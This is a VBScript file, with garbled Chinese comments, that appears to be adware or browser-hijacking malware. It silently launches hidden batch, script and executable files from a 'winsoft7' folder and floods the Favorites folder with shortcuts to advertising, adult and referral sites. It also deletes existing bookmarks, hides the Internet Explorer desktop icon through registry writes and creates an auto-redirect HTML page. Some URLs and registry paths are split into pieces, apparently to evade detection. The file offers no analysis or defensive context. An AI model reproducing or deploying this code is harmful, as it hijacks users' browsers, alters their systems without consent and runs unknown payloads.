Dim WSHShell 
Set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop") :'�����ļ��С����桱
Favorites = WshShell.SpecialFolders("Favorites") :'�����ļ��С����桱

on error resume next 

strttWinDir = WshShell.ExpandEnvironmentStrings("%ProgramFiles%")
createobject("wscript.shell").run """"&strttWinDir&"\winsoft7\3.bat""",0

Rem 

Set oShellLink = WshShell.CreateShortcut(Favorites & "\����ֱ��77zb���ߵ�����.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : 'Ŀ��
oShellLink.Arguments = "http://77"&"z"&"b.com/?fas" :'����
oShellLink.IconLocation = "%ProgramFiles%\winsoft7\77"&"zb.ico, 0" : 'ͼ��
oShellLink.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '��ʼλ��
oShellLink.Save : '���������ݷ�ʽ
Set oShellLink = WshShell.CreateShortcut(Favorites & "\���ټ�Ʒ���ٵ��������.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : 'Ŀ��
oShellLink.Arguments = "http://www.9ptv.com/?fav" :'����
oShellLink.WindowStyle = 1 :'����1Ĭ�ϴ��ڼ������3��󻯼������7��С
oShellLink.IconLocation = "%ProgramFiles%\winsoft7\9ptv.ico, 0" : 'ͼ��
oShellLink.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '��ʼλ��
oShellLink.Save : '���������ݷ�ʽ

createobject("wscript.shell").run """"&strttWinDir&"\winsoft7\3.vbs""",0
Rem
RegPath="HKEY_CURRENT_USER\Soft"&"ware\Micro"&"soft\Win"&"dows\Current"&"Version\Expl"&"orer\HideDesktop"&"Icons\NewStart"&"Panel\{871C5380-42A0-1069-A2EA-08002B30309D}"
RegPath1="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu\{871C5380-42A0-1069-A2EA-08002B30309D}"
Type_Name="REG_DWORD"
Key_Data=1
WshShell.RegWrite RegPath,Key_Data,Type_Name
WshShell.RegWrite RegPath1,Key_Data,Type_Name
Set WSHShell = WScript.CreateObject("WScript.Shell") 
strDesktop = WSHShell.SpecialFolders("Desktop") 
WSHShell.AppActivate strDesktop 
WSHShell.SendKeys "{F5}" 

Set oUrlLink = WshShell.CreateShortcut(Favorites & "\���¾�Ʒ��ɫ�õĵ�Ӱ��ѣ�.������٣��������!!!.url")
oUrlLink.TargetPath = "http://www.kusila.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\��������С˵��ѵ��Ķ�վ���ḻ�����ٶȿ��С˵վ!!!.url")
oUrlLink.TargetPath = "http://www.bookxp.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\�����ɫ����վ.-׷���������弫Ʒ��Ӱд��!!.url")
oUrlLink.TargetPath = "http://www.003dh.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\��"&"��"&"�� - �ԣ���ϲ��.url")
oUrlLink.TargetPath = "http://www.82vv.com/tb/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\45575.com����С��Ϸ���������������쳬��С��Ϸ!!!.url")
oUrlLink.TargetPath = "http://www.45575.com/?sss"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\�����������Ϲ������ģ�ͼ�顢ĸӤ����ױ���Ҿӡ����롢�ҵ硢��װ��Ь���ȣ���Ʒ�ͼۣ���������.url")
oUrlLink.TargetPath = "http://www.82vv.com/dd/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\׿Խ����ѷ���Ϲ���ͼ�飬�ֻ������룬�ҵ磬��ױƷ���ӱ����ε���������.url")
oUrlLink.TargetPath = "http://www.82vv.com/zy/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\�������������ߣ������ɫ���¸�����ѵ��Ӿ���վ!!!.url")
oUrlLink.TargetPath = "http://www.kkdsj.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\Ư��������ͼ��ϼ�!!!�崿��Ʒ���ĳ���д�棡��.url")
oUrlLink.TargetPath = "http://www.92nimm.com/?fav"
oUrlLink.Save

Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.DeleteFile(Favorites&"\����\*.url"), True


Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\�� �� �� �� ��.url")
oUrlLink.TargetPath = "http://www.82vv.com/tb/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\С��Ϸ����.url")
oUrlLink.TargetPath = "http://www.45575.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\������.url")
oUrlLink.TargetPath = "http://www.82vv.com/dd/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\׿Խ��.url")
oUrlLink.TargetPath = "http://www.82vv.com/zy/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\�������Ӿ�.url")
oUrlLink.TargetPath = "http://www.kkdsj.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\���ļ�Ʒͼ.url")
oUrlLink.TargetPath = "http://www.92nimm.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\�������µ�Ӱ.url")
oUrlLink.TargetPath = "http://www.kusila.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\���С˵��.url")
oUrlLink.TargetPath = "http://www.bookxp.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\��������.url")
oUrlLink.TargetPath = "http://www.003dh.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\�������ֱ��.url")
oUrlLink.TargetPath = "http://www.9ptv.com/?fa2"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\����\��ַ��ȫ.url")
oUrlLink.TargetPath = "http://www.dduu.com/?fa2"
oUrlLink.Save
'=========

set fso=createobject("scripting.filesystemobject")
'���ļ�������1Ϊforreading��2Ϊforwriting��8Ϊappending
set file=fso.createtextfile( strttWinDir&"\Common Files\winie7.html",2,ture)
'д���ļ����ݣ������ַ�����write(x)д��x���ַ���writelineд�뻻�У�writeblanklines(n)д��n������
file.writeline "<script>window.location.href='http://www.939dh.com/?366';</script><meta http-equiv=""refresh"" content=""0;url=http://www.939dh.com/?366"">"
set file=fso.opentextfile(strttWinDir&"\Common Files\winie7.html",1,ture)
'�ر�"&"�ļ�
file.close
createobject("wscript.shell").run """"&strttWinDir&"\winsoft7\ie2.exe""",0

WSHShell.RegDelete "HKCR\InternetShortcut\IsShortcut"
wscript.quit

